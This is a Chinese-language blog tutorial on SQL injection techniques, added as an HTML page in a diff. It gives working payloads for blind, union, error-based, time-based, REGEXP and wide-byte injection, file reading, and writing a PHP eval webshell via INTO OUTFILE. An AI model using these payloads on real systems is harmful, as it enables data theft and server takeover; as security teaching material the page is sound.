@@ -1,0 +1,350 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SQL注入的各种姿势 - gravity的个人博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="GraVity0,"> 
+    <meta name="description" content="SQL注入终极指南目录一、Boolean 盲注二、union注入三、文件读写四、floor报错注入五、Xpath函数错误注入六、sleep延时注入七、REGEXP正则匹配八、宽字节注入九、过滤绕过首,"> 
+    <meta name="author" content="yuntao you"> 
+    <link rel="alternative" href="atom.xml" title="gravity的个人博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/first.jpg"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">gravity的个人博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">SQL注入的各种姿势</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">SQL注入的各种姿势</h1>
+        <div class="stuff">
+            <span>十一月 29, 2018</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="SQL注入终极指南"><a href="#SQL注入终极指南" class="headerlink" title="SQL注入终极指南"></a>SQL注入终极指南</h1><h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><h4 id="一、Boolean-盲注"><a href="#一、Boolean-盲注" class="headerlink" title="一、Boolean 盲注"></a>一、Boolean 盲注</h4><h4 id="二、union注入"><a href="#二、union注入" class="headerlink" title="二、union注入"></a>二、union注入</h4><h4 id="三、文件读写"><a href="#三、文件读写" class="headerlink" title="三、文件读写"></a>三、文件读写</h4><h4 id="四、floor报错注入"><a href="#四、floor报错注入" class="headerlink" title="四、floor报错注入"></a>四、floor报错注入</h4><h4 id="五、Xpath函数错误注入"><a href="#五、Xpath函数错误注入" class="headerlink" title="五、Xpath函数错误注入"></a>五、Xpath函数错误注入</h4><h4 id="六、sleep延时注入"><a href="#六、sleep延时注入" class="headerlink" title="六、sleep延时注入"></a>六、sleep延时注入</h4><h4 id="七、REGEXP正则匹配"><a href="#七、REGEXP正则匹配" class="headerlink" title="七、REGEXP正则匹配"></a>七、REGEXP正则匹配</h4><h4 id="八、宽字节注入"><a href="#八、宽字节注入" class="headerlink" title="八、宽字节注入"></a>八、宽字节注入</h4><h4 id="九、过滤绕过"><a href="#九、过滤绕过" class="headerlink" title="九、过滤绕过"></a>九、过滤绕过</h4><p>首先手动判断是否存在SQL注入：<br><img src="https://i.loli.net/2018/12/01/5c020e9383167.png" alt="100.png"><br>1.数字型判断是否存在SQL注入<br>如果俩次页面不一样则存在注入：<br>select * from test where id=1 and  1=1;<br>select * from test where id=1 and  1=2;<br>也可以<br>select * from test where id=1 or 1=1;<br>select * from test where id=1 or 1=2;<br>2.字符型判断是否存在SQL注入<br>select * from test where username=’admin’ and ‘1’=’1’;<br>select * from test where  username=’admin’ and ‘1’=’2’;<br>或<br>select * from test where username=’ ‘ or ‘1’=’1’;<br>select * from test where  username=’ ‘ or ‘1’=’2’;    </p>
+<h5 id="一、Boolean-盲注-1"><a href="#一、Boolean-盲注-1" class="headerlink" title="一、Boolean 盲注"></a>一、Boolean 盲注</h5><p>什么是盲注：<br>盲注就是指在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，就对攻击造成了很大的阻碍，因为缺少了重要的调试信息，所以攻击者必须找到一个方法来验证SQL语句是否得到了执行。<br>考虑Boolean的状况<br>1.没有报错信息<br>2.不管是正确的输入，还是错误的输入，都只显示两种情况 (我们可以认为是0或者1)<br>3.在正确的输入下，输入and 1=1/and 1=2 发现可以判断<br>Length（）函数 返回字符串的长度<br>Substr（）截取字符串<br>Ascii（）返回字符的ascii码<br>sleep(n)：将程序挂起一段时间 n为n秒<br>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句<br>count(*)计数<br>concat()连接字符          </p>
+<h6 id="1-判断数据库"><a href="#1-判断数据库" class="headerlink" title="1.判断数据库"></a>1.判断数据库</h6><p>虽然大部分的SQL语句都类似，但是每个数据库还是有自己特殊的表，可以通过表来分辨是哪些数据库。mysql特有的表是information_schema.tables; access特有的表是mysobjects；sqlsever数据库特有的表是sysobjects。那么就可以用如下的语句判断数据库，那个页面正常显示就属于哪个数据库。<br><strong>判断是否为Mysql数据库</strong><br>http://……/?id=1’ and exists(select * from information_schema.tables) # </p>
+<p><strong>判断是否是access数据库</strong><br>http://……/?id=1’ and exists(select * from mysobjects) #     </p>
+<p><strong>判断是否是sqlsever数据库</strong><br>http://……/?id=1’ and exists(select * from sysobjects) #     </p>
+<h6 id="2-判断当前数据库"><a href="#2-判断当前数据库" class="headerlink" title="2.判断当前数据库"></a>2.判断当前数据库</h6><p>a. 判断当前数据库的长度，利用二分法<br>http://……/?id=1’ and length(database())&gt;5   正常显示<br>http://……/?id=1’ and length(database())&gt;10  不显示任何数据<br>http://……/?id=1’ and length(database())&gt;7   正常显示<br>http://……/?id=1’ and length(database())&gt;8   不显示任何数据<br>此时可以得知数据库的长度为7。<br>b. 判断当前数据库的字符，和上面一样，利用二分法依此判断<br><strong>判断第一个字符</strong><br>可以用字频法，二分法。<br>字频法可以参考下面的图（比较玄学，基本看脸，个人建议二分法）。<br><img src="https://i.loli.net/2018/12/01/5c020f23d488c.png" alt="101.png"><br>二分法：<br><img src="https://i.loli.net/2018/12/01/5c0226ca7f321.png" alt="102.png"><br>http://……/?id=1’ and ascii(substr(database(),1,1))&gt;97<br>……….<br><strong>判断第二个字符</strong><br>http://……/?id=1’ and ascii(substr(database(),2,1))&gt;97<br>……….<br>由此依此判断出数据库名  如：test、security……..   </p>
+<h6 id="3-判断数据库中的表"><a href="#3-判断数据库中的表" class="headerlink" title="3.判断数据库中的表"></a>3.判断数据库中的表</h6><p>1：判断当前数据库中表的个数<br>// 判断当前数据库中的表的个数是否大于5，用二分法依次判断<br>http://……../?id=1’ and (select count(table_name) from information_schema.tables where table_schema=database())&gt;5 #</p>
+<p>2：判断每个表的长度<br>//判断第一个表的长度，用二分法依次判断<br>http://……../?id=1’ and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6</p>
+<p>//判断第二个表的长度，用二分法依次判断<br>http://………/?id=1’ and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))&gt;6</p>
+<p>3：判断每个表的每个字符的ascii值<br>//判断第一个表的第一个字符的ascii值<br>http://……./?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 #</p>
+<p>//判断第一个表的第二个字符的ascii值<br>http://……./?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 #</p>
+<p>………<br>例：  由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断    </p>
+<h5 id="4-判断表中的字段"><a href="#4-判断表中的字段" class="headerlink" title="4. 判断表中的字段"></a>4. 判断表中的字段</h5><p>1：判断表中字段的个数<br>//判断users表中字段个数是否大于5<br>http://……../?id=1’ and (select count(column_name) from information_schema.columns where table_name=’users’)&gt;5 #   </p>
+<p>2：判断字段的长度<br>//判断第一个字段的长度<br>http://……../?id=1’ and length((select column_name from information_schema.columns where table_name=’users’ limit 0,1))&gt;5</p>
+<p>//判断第二个字段的长度<br>http://………/?id=1’ and length((select column_name from information_schema.columns where table_name=’users’ limit 1,1))&gt;5</p>
+<p>3：判断字段的ascii值<br>//判断第一个字段的第一个字符的长度<br>http://………/?id=1’ and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1,1))&gt;100</p>
+<p>//判断第一个字段的第二个字符的长度<br>http://………/?id=1’ and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),2,1))&gt;100</p>
+<p>………..<br>例：由此可判断出users表中存在 id、username、password 字段        </p>
+<h5 id="5-判断字段中的数据"><a href="#5-判断字段中的数据" class="headerlink" title="5.判断字段中的数据"></a>5.判断字段中的数据</h5><p>1: 判断数据的长度<br>// 判断id字段的第一个数据的长度<br>http://……../?id=1’ and length((select id from users limit 0,1))&gt;5</p>
+<p>// 判断id字段的第二个数据的长度<br>http://………/?id=1’ and length((select id from users limit 1,1))&gt;5</p>
+<p>2：判断数据的ascii值<br>// 判断id字段的第一个数据的第一个字符的ascii值<br>http://………./?id=1’ and ascii(substr((select id from users limit 0,1),1,1))&gt;100</p>
+<p>// 判断id字段的第一个数据的第二个字符的ascii值<br>http://………./?id=1’ and ascii(substr((select id from users limit 0,1),2,1))&gt;100</p>
+<p>………..<br>通过ascii码得到数据，完成盲注。     </p>
+<h4 id="二：union-注入"><a href="#二：union-注入" class="headerlink" title="二：union 注入"></a>二：union 注入</h4><p>我们可以通过这些函数获得该数据库的一些重要的信息</p>
+<p>version() ：数据库的版本     database() :当前所在的数据库    @@basedir :  数据库的安装目录</p>
+<p>@@datadir ： 数据库文件的存放目录     user() ： 数据库的用户   current_user() : 当前用户名</p>
+<p>system_user() : 系统用户名     session_user() :连接到数据库的用户名<br>1 .判断列数</p>
+<p>order by / group by      </p>
+<p>union select 要求两个表查询的字段数必须相同，否则报错(列名以第一个select为准)<br> 2 .使原数据查询为空</p>
+<p>如id=2改为id=-2或id=2000000查询不存在的数据则为空，就可以显示要查询的敏感数据（防止正常数据干扰）<br>3 .使用1，2，3，4，5占位</p>
+<p>如union select 1,2,3,4,5判断出可以显示的位置（显示位），如果要求字段类型也要相同，则使用null代替数字。</p>
+<p>4 .将数字替换成敏感数据</p>
+<p>如union select 1,2,user(),database(),5<br>因为比较常规，就不多说了。    </p>
+<h4 id="三、文件读写-1"><a href="#三、文件读写-1" class="headerlink" title="三、文件读写"></a>三、文件读写</h4><p>当有显示列的时候，文件读可以利用union注入。当没有显示列的时候，只能利用盲注；<br>文件写入只能利用union注入<br>例：读取e盘下3.txt文件<br><strong>union注入读取文件</strong><br>http://……../?id=1’ union select 1,2,load_file(“e:/3.txt”) #<br>也可以把 e:/3.txt 转换成16进制 0x653a2f332e747874<br>http://……./?id=1’ union select 1,2,load_file(0x653a2f332e747874) #<br><strong>盲注读取文件</strong><br>盲注的话就是利用hex函数，将读取的字符串转换成16进制，再利用ascii函数，转换成ascii码，再利用二分法一个一个的判断字符，一般用工具代替人工来完成。<br>http://………./?id=1’ and ascii(mid((select hex(load_file(‘e:/3.txt’))),18,1))&gt;49#’ LIMIT 0,1<br>我们可以利用写入文件的功能，在e盘创建4.php文件，然后写入一句话木马<br><strong>union写入文件</strong><br>利用union注入写入一句话木马  into outfile 和 into dumpfile 都可以<br><a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a>  union select 1,2,(‘&lt;?php @eval($_POST[aaa])?&gt;’)  into outfile  ‘e:/yyt.php’ #</p>
+<p>// 可以将一句话木马转换成16进制的形式<br><a href="http://127.0.0.1/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli/Less-1/?id=1&#39;</a>  union select 1,2,(0x3c3f70687020406576616c28245f504f53545b6161615d293f3e)  into outfile  ‘e:/yyt.php’ #   </p>
+<h4 id="四：floor报错注入"><a href="#四：floor报错注入" class="headerlink" title="四：floor报错注入"></a>四：floor报错注入</h4><p>floor函数是一个下去整函数<br>rand(0)能够产生一个随机数<br>floor(rand(0)*2)能够产生0或者1的随机二值<br>count(*)+group by * 会对查询表格归类计数，相同值的列归一后计数加一。<br>concat()可以将两列值合并为一列select<br>select count(*),concat(floor(rand(0)*2),version())x from information_schema.tables group by x;<br>在临时表格生成时，数据库对于是否合并随机数0，1产生歧义而报错。<br>select count(*),concat(floor(rand(0)*2),database())x from information_schema.tables group by x;<br><a href="https://i.loli.net/2018/11/23/5bf7e03004331.jpg" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/23/5bf7e03004331.jpg" alt="98.jpg"></a><br>标志性语句Duplicate entry 其中’  ‘中的内容为随机数和真实存在的表名去掉随机数后就得到了表名。  </p>
+<h4 id="五、Xpath函数错误注入-1"><a href="#五、Xpath函数错误注入-1" class="headerlink" title="五、Xpath函数错误注入"></a>五、Xpath函数错误注入</h4><p>1.定义：<br>近年来在现代化电子商务，商场现代化系统中，XML技术被广泛 的使用，开始出现针对XML数据信息的XPath注入攻击技术。 注入攻击是指利用系统没有对其输入进行强制执行或检查的假设向计算机系统中引入（或 “注入”）代码的技术。注入代码的目的通常是绕过或修改程序的最初目标功能，如果被绕过的功能涉及系统安全，那么结果可能是灾难性的。在XML信息被大量 使用，其数据的安全性显得非常重要，但是目前很少有研究人员研究XPath的注入攻击防御技术。</p>
+<pre><code>XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知 识的情况下，通过XPath查询得到一个XML文档的完整内容。      
+</code></pre><p>了解xml可到：<a href="https://blog.csdn.net/qsbbl/article/details/78628472" target="_blank" rel="noopener">https://blog.csdn.net/qsbbl/article/details/78628472</a>      </p>
+<p>有了数据库为什么还要用XML？<br>1：尽管XML和数据库都可以定义数据模型并存储数据，然而，XML更加通用、更加标准化。   </p>
+<pre><code> 一是这个接口数据库是某种数据库产品（DB2\MSSQL\MYSQL），接口代码在更换了数据库产品后需要修改或重写；     
+ 二是如果接口需求变动的话，可能要改动数据库结构，导致还要改接口代码，这是致命的。      
+ 三是接口的稳定取决于这个数据库管理系统本身要稳定，你得考虑维护管理（自动化日志清理等）问题；     
+ 四是为了穿过防火墙（电信、网通公司可能会关闭某些端口）及安全性考虑，你不能直接通过TCP/IP去访问远程接口机器上的数据库，需要将数据再编码发布（比如之前的Remoting或现在的WCF）     
+ 那么现在我们改用XML来做程序接口，我们给其他公司的是一些XML Schema、Web Serivce的URI、业务流程说明，我们不再需要一个接口电脑、接口数据库等，现在上述的四个问题不再困扰我们。   
+</code></pre><p>2：我们之前的业务数据库大概有二百多张表，一年左右会因需求变动对表结构做些调整，当然也影响到了应用程序代码的调整，现在我们的业务数据库大概有不到五十张表，因为一些容易发生需求变动的表和一些半结构化、非结构化的数据被存储为数据库表内的XML字段，需求变动仅影响我们去修改一下Schema，不用去动数据库结构，这对已经部署到用户那边的系统来说是非常重要的改进。不仅如此，表数量的减少对开发人员、业务人员、数据库管理人员非常有益。</p>
+<p>3：说了两点XML的好处，那么我再说说它作为数据存储方面目前无法替代 数据库的地方：<br>    XML缺少数据库具备的特性：高效的存储（即使是数据库内XML字段还是没有传统字段的速度快）、索引和数据修改机制（DB2等数据库产品对XML内的元素和属性可以加索引，内建在数据库中的XML字段享受了数据库带来的一些好处）；严格的数据安全访问控制；完整的事务和数据一致性控制；多用户访问机制；触发器、完善的并发控制等因此，用户量大、数据集成度高以及性能要求高的数据环境中还是需要数据库来完成任务，IBM的DB2工程师也在讨论时建议我们统计类数据还是用传统字段为好。<br>总之，现在XML对数据库是一个很好的补充，大的数据库厂商都在数据库产品里内置了对XML的支持，这样将XML与数据库配合使用，将让他们相互配合利用各自发挥出威力，也提高也我们信息产品的灵活性。</p>
+<p>extractvalue(XML_document,XPath_string):从目标XML中返回包含所查询值的字符串。<br>第一个参数：XML_document是string的格式，为XML文档对象的名。<br>第二个参数：XPath_string(Xpath格式的字符串)<br>concat：返回结果为连接参数产生的字符串<br>原理：通过concat函数将查询到的信息拼接成字符串，由于extractvalue函数的第二个参数需要Xpath格式字符串。现在显然不符合要求，所以会报错。<br>http://……/?id=1’ and extractvalue(1,concat(0x7e,version(),0x7e)) #<br>http://……/?id=1’ and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)) #     </p>
+<h4 id="六、sleep延时注入-1"><a href="#六、sleep延时注入-1" class="headerlink" title="六、sleep延时注入"></a>六、sleep延时注入</h4><p><strong>用法1</strong>sleep函数用来判断页面响应时间<br>http://……/?id=1’ and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5)) #<br>判断数据库的第一个字符的ascii值是否大于100，如果大于100，页面立即响应，如果不大于，页面延时5秒响应<br><strong>用法2</strong>Mysql中sleep(n)让语句停留n秒时间，然后返回0，若命令被中断，则返回1。<br>因此，可以认为在通常情况下sleep函数返回值为恒为0，可以借助sleep(n)=0的永真性执行sql注入。</p>
+<h4 id="七、REGEXP正则匹配-1"><a href="#七、REGEXP正则匹配-1" class="headerlink" title="七、REGEXP正则匹配"></a>七、REGEXP正则匹配</h4><p><img src="https://i.loli.net/2018/11/30/5c0141a918eda.png" alt="99.png"><br>正则表达式，又称规则表达式（Regular Expression），计算机科学的一个概念。正则表达式通常被用来索引、替换符合某个规则的文本。<br>MySQL数据库中正则表达式的语法，主要包括各种符号的含义。</p>
+<p>（^）字符</p>
+<p>匹配字符串的开始位置，如“^a”表示以字母a开头的字符串。<br>  mysql&gt; select ‘xxxyyy’ regexp ‘^xx’;<br> <code><br>+———————–+<br>| ‘xxxyyy’ regexp ‘^xx’ |<br>+———————–+<br>|           1 |<br>+———————–+<br>1 row in set (0.00 sec)<br></code><br>查询xxxyyy字符串中是否以xx开头，结果值为1，表示值为true，满足条件。<br>（$）字符</p>
+<p>匹配字符串的结束位置，如“X$”表示以字母X结尾的字符串。</p>
+<p>（.）字符</p>
+<p>这个字符就是英文下的点，它匹配任何一个字符，包括回车、换行等。</p>
+<p>（*）字符</p>
+<p>星号匹配0个或多个字符，在它之前必须有内容。如：   </p>
+<p>mysql&gt; select ‘xxxyyy’ regexp ‘x*’;     </p>
+<p>这个SQL语句，正则匹配为true。  </p>
+<p>（+）字符</p>
+<p>加号匹配1个或多个字符，在它之前也必须有内容。加号跟星号的用法类似，只是星号允许出现0次，加号则必须至少出现一次。</p>
+<p>（?）字符</p>
+<p>问号匹配0次或1次。</p>
+<p>实例:</p>
+<p>现在根据上面的表，可以装置各种不同类型的SQL查询以满足要求。在这里列出一些理解。考虑我们有一个表为person_tbl和有一个字段名为名称：</p>
+<p>查询找到所有的名字以’st’开头    </p>
+<p>mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP ‘^st’;    </p>
+<p>查询找到所有的名字以’ok’结尾    </p>
+<p>mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP ‘ok$’;    </p>
+<p>查询找到所有的名字包函’mar’的字符串    </p>
+<p>mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP ‘mar’;     </p>
+<p>查询找到所有名称以元音开始和’ok’结束 的   </p>
+<p>mysql&gt; SELECT name FROM person_tbl WHERE name REGEXP ‘^[aeiou]|ok$’;  </p>
+<p>一个正则表达式中的可以使用以下保留字    </p>
+<p><strong>^</strong></p>
+<p>所匹配的字符串以后面的字符串开头<br>mysql&gt; select “fonfo” REGEXP “^fo$”; -&gt; 0（表示不匹配）<br>mysql&gt; select “fofo” REGEXP “^fo”; -&gt; 1（表示匹配）  </p>
+<p><strong>$</strong><br>所匹配的字符串以前面的字符串结尾    </p>
+<p><strong>.</strong>   </p>
+<p>匹配任何字符（包括新行）   </p>
+<p>mysql&gt; select “fofo” REGEXP “^f.*“; -&gt; 1（表示匹配）<br>mysql&gt; select “fonfo” REGEXP “^f.*“; -&gt; 1（表示匹配）    </p>
+<p><strong>a* </strong>     </p>
+<p>匹配任意多个a（包括空串)    </p>
+<p>mysql&gt; select “Ban” REGEXP “^Ba*n”; -&gt; 1（表示匹配）<br>mysql&gt; select “Baaan” REGEXP “^Ba*n”; -&gt; 1（表示匹配）<br>mysql&gt; select “Bn” REGEXP “^Ba*n”; -&gt; 1（表示匹配）    </p>
+<p><strong>a+</strong>  </p>
+<p>匹配任意多个a（不包括空串)<br>mysql&gt; select “Ban” REGEXP “^Ba+n”; -&gt; 1（表示匹配）<br>mysql&gt; select “Bn” REGEXP “^Ba+n”; -&gt; 0（表示不匹配）   </p>
+<p><strong>a?</strong></p>
+<p>匹配一个或零个a    </p>
+<p>mysql&gt; select “Bn” REGEXP “^Ba?n”; -&gt; 1（表示匹配）<br>mysql&gt; select “Ban” REGEXP “^Ba?n”; -&gt; 1（表示匹配）<br>mysql&gt; select “Baan” REGEXP “^Ba?n”; -&gt; 0（表示不匹配）    </p>
+<p><strong>de|abc</strong></p>
+<p>匹配de或abc    </p>
+<p>mysql&gt; select “pi” REGEXP “pi|apa”; -&gt; 1（表示匹配）<br>mysql&gt; select “axe” REGEXP “pi|apa”; -&gt; 0（表示不匹配）<br>mysql&gt; select “apa” REGEXP “pi|apa”; -&gt; 1（表示匹配）<br>mysql&gt; select “apa” REGEXP “^(pi|apa)$”; -&gt; 1（表示匹配）<br>mysql&gt; select “pi” REGEXP “^(pi|apa)$”; -&gt; 1（表示匹配）<br>mysql&gt; select “pix” REGEXP “^(pi|apa)$”; -&gt; 0（表示不匹配）    </p>
+<p><strong>(abc)* </strong></p>
+<p>匹配任意多个abc（包括空串)    </p>
+<p>mysql&gt; select “pi” REGEXP “^(pi)*$”; -&gt; 1（表示匹配）<br>mysql&gt; select “pip” REGEXP “^(pi)*$”; -&gt; 0（表示不匹配）<br>mysql&gt; select “pipi” REGEXP “^(pi)*$”; -&gt; 1（表示匹配）    </p>
+<p><strong>{1}</strong><br><strong>{2,3}</strong></p>
+<p>这是一个更全面的方法，它可以实现前面好几种保留字的功能</p>
+<p>a*<br>可以写成a{0,}</p>
+<p>a+<br>可以写成a{1,}</p>
+<p>a?<br>可以写成a{0,1}</p>
+<p>在{}内只有一个整型参数i，表示字符只能出现i次；在{}内有一个整型参数i，后面跟一个“，”，表示字符可以出现i次或i次以上；在{}内只有一个整型参数i，后面跟一个“，”，再跟一个整型参数j,表示字符只能出现i次以上，j次以下（包括i次和j次）。</p>
+<p>其中的整型参数必须大于等于0,小于等于RE_DUP_MAX(默认是255)。如果有两个参数，第二个必须大于等于第一个</p>
+<p>[a-dX]</p>
+<p>匹配“a”、“b”、“c”、“d”或“X”</p>
+<p>[^a-dX]</p>
+<p>匹配除“a”、“b”、“c”、“d”、“X”以外的任何字符。</p>
+<p>“[”、“]”必须成对使用     </p>
+<p>mysql&gt; select “aXbc” REGEXP “[a-dXYZ]”; -&gt; 1（表示匹配）<br>mysql&gt; select “aXbc” REGEXP “^[a-dXYZ]$”; -&gt; 0（表示不匹配）<br>mysql&gt; select “aXbc” REGEXP “^[a-dXYZ]+$”; -&gt; 1（表示匹配）<br>mysql&gt; select “aXbc” REGEXP “^[^a-dXYZ]+$”; -&gt; 0（表示不匹配）<br>mysql&gt; select “gheis” REGEXP “^[^a-dXYZ]+$”; -&gt; 1（表示匹配）<br>mysql&gt; select “gheisa” REGEXP “^[^a-dXYZ]+$”; -&gt; 0（表示不匹配）  </p>
+<p><strong>MYSQL 5+</strong></p>
+<p>我们都已经知道，在MYSQL 5+中 information_schema库中存储了所有的 库名，表明以及字段名信息。故攻击方式如下：</p>
+<ol>
+<li>判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名。</li>
+</ol>
+<p>注：正则表达式中 ^[a-z] 表示字符串中开始字符是在 a-z范围内</p>
+<p>http://…../?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ‘^[a-z]’ LIMIT 0,1) /*</p>
+<ol start="2">
+<li>判断第一个字符是否是a-n中的字符</li>
+</ol>
+<p>http://…../?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ‘^[a-n]’ LIMIT 0,1)/*</p>
+<ol start="3">
+<li>确定该字符为n</li>
+</ol>
+<p>http://…../?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ‘^n’ LIMIT 0,1) /*</p>
+<ol start="4">
+<li>表达式的更换如下   </li>
+</ol>
+<p>expression like this: ‘^n[a-z]’ -&gt; ‘^ne[a-z]’ -&gt; ‘^new[a-z]’ -&gt; ‘^news[a-z]’ -&gt; FALSE</p>
+<p>这时说明表名为news ，要验证是否是该表名正则表达式为’^news$’，但是没这必要，直接判断 table_name = ‘news’就行了。</p>
+<p>5.接下来猜解其它表了<br><strong>常见错误</strong>（修改 limit 1,1 -&gt; limit 2,1就对接下来的表进行盲注）</p>
+<p>regexp匹配的时候会在所有的项都进行匹配。例如：</p>
+<p>security数据库的表有多个，users，email等</p>
+<p>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^u[a-z]’ limit 0,1);是正确的</p>
+<p>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);是正确的</p>
+<p>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^em[a-z]’ limit 0,1);是正确的</p>
+<p>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 1,1);不正确</p>
+<p>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=’security’ and table_name regexp ‘^em[a-z]’ limit 1,1);不正确</p>
+<p>在limit 0,1下，regexp会匹配所有的项。我们在使用regexp时，要注意有可能有多个项，同时要一个个字符去爆破。类似于上述第一条和第二条。而此时limit 0,1是对于where table_schema=’security’ limit 0,1。table_schema=’security’已经起到了限定作用了，limit有没有已经不重要了。</p>
+<p> <strong>MSSQL</strong></p>
+<p>MSSQL所用的正则表达式并不是标准正则表达式 ，该表达式使用 like关键词</p>
+<p>default.asp?id=1 AND 1=(SELECT TOP 1 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli” and table_name LIKE ‘[a-z]%’ )</p>
+<p>该查询语句中，select top 1 是一个组合哦，不要看错了。</p>
+<p>如果要查询其它的表名，由于不能像mysql哪样用limit x,1，只能使用 table_name not in (select top x table_name from information_schema.tables) 意义是：表名没有在前x行里，其实查询的就是第x+1行。</p>
+<p>例如 查询第二行的表名：</p>
+<p>default.asp?id=1 AND 1=(SELECT TOP 1 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli” and table_name NOT IN ( SELECT TOP 1 table_name FROM information_schema.tables) and table_name LIKE ‘[a-z]%’ )</p>
+<p>表达式的顺序：</p>
+<p>‘n[a-z]%’ -&gt; ‘ne[a-z]%’ -&gt; ‘new[a-z]%’ -&gt; ‘news[a-z]%’ -&gt; TRUE</p>
+<p>之所以表达式 news[a-z]查询后返回正确是应为%代表0-n个字符，使用”_“则只能代表一个字符。故确认后续是否还有字符克用如下表达式</p>
+<p>‘news%’ TRUE -&gt; ‘news_‘ FALSE    </p>
+<h4 id="八：宽字节注入"><a href="#八：宽字节注入" class="headerlink" title="八：宽字节注入"></a>八：宽字节注入</h4><p>宽字节注入是由于不同编码中中英文所占字符的不同所导致的。通常来说，在GBK编码中，一个汉字占用两个字节。而在UTF-8编码时，一个汉字占用三个字节。在php中，我们可以通过输入 echo strlen(“中”)来测试，除了GBK编码以外，所有的中文都是占用俩个字节。   </p>
+<p>先补充一点背景：<br>大家都知道PHP在开启magic_quotes_gpc或者使用addslashes、iconv等函数的时候，单引号（’）会被转义成\’。比如字符%bf在满足上述条件的情况下会变成%bf\’。其中反斜杠（\）的十六进制编码是%5C，单引号（’）的十六进制编码是%27，那么就可以得出%bf \’=%bf%5c%27。如果程序的默认字符集是GBK等宽字节字符集，则MySQL会认为%bf%5c是一个宽字符，也就是“縗”。也就是说%bf \’=%bf%5c%27=縗’。</p>
+<p>说 到这里好像还没有看出来到底有什么用。了解PHP+MySQL注入的朋友应该都明白，单引号在注入里绝对是个好东西。尤其是，很多程序员都过分依赖于 magic_quotes_gpc或者addslashes、iconv等函数的转义。理论上说，只要数据库连接代码设置了GBK编码，或者是默认编码就 是GBK，那现在的程序里到处都是注入漏洞          </p>
+<p>addslashes()函数，这个函数返回在预定义字符之前添加反斜杠 \ 。预定义字符：  单引号 ‘ 、双引号 “ 、反斜杠 \ 、NULL。但是这个函数有一个特点就是虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。这个函数的功能和魔术引号完全相同，所以当打开了魔术引号时，不能使用这个函数。可以使用get_magic_quotes_gpc()来检测是否已经转义。</p>
